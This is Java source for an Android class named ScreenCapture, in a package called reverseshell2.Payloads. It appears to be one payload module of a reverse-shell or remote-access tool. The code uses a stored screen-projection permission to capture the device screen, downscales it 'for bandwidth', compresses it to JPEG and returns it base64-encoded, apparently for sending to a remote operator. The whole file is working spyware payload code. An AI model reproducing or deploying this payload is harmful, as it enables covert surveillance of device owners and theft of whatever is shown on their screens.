package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCapture {

    private static final String TAG = "ScreenCapture";
    private static MediaProjection mediaProjection;
    private static int resultCode;
    private static Intent resultData;
    private static boolean hasPermission = false;

    // Call from MainActivity when MediaProjection permission is granted
    public static void setMediaProjectionPermission(int code, Intent data) {
        resultCode = code;
        resultData = data;
        hasPermission = true;
        Log.d(TAG, "MediaProjection permission stored");
    }

    public static boolean hasPermission() {
        return hasPermission;
    }

    public static String takeScreenshot(Context context) {
        if (!hasPermission || resultData == null) {
            return "ERROR: Screen capture permission not granted. Relaunch the app.";
        }

        try {
            MediaProjectionManager mpm = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpm.getMediaProjection(resultCode, (Intent) resultData.clone());

            if (mediaProjection == null) {
                return "ERROR: Failed to create MediaProjection";
            }

            // Get screen dimensions
            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);

            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            // Scale down for bandwidth
            int scaledWidth = width / 2;
            int scaledHeight = height / 2;

            final ImageReader imageReader = ImageReader.newInstance(scaledWidth, scaledHeight, PixelFormat.RGBA_8888, 2);
            final VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                scaledWidth, scaledHeight, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, null
            );

            // Wait briefly for the first frame
            final String[] result = {null};
            final Object lock = new Object();

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * scaledWidth;

                        Bitmap bitmap = Bitmap.createBitmap(scaledWidth + rowPadding / pixelStride, scaledHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        // Crop to exact screen size
                        Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, scaledWidth, scaledHeight);
                        bitmap.recycle();

                        // Compress to JPEG
                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                        cropped.compress(Bitmap.CompressFormat.JPEG, 50, bos);
                        cropped.recycle();

                        synchronized (lock) {
                            result[0] = Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT);
                            lock.notifyAll();
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error capturing screen", e);
                    synchronized (lock) {
                        result[0] = "ERROR: " + e.getMessage();
                        lock.notifyAll();
                    }
                } finally {
                    if (image != null) image.close();
                }
            }, new Handler(Looper.getMainLooper()));

            // Wait up to 3 seconds for the screenshot
            synchronized (lock) {
                lock.wait(3000);
            }

            // Cleanup
            virtualDisplay.release();
            imageReader.close();
            mediaProjection.stop();

            if (result[0] != null) {
                return result[0];
            }
            return "ERROR: Timed out waiting for screenshot";

        } catch (Exception e) {
            Log.e(TAG, "Screenshot failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
}
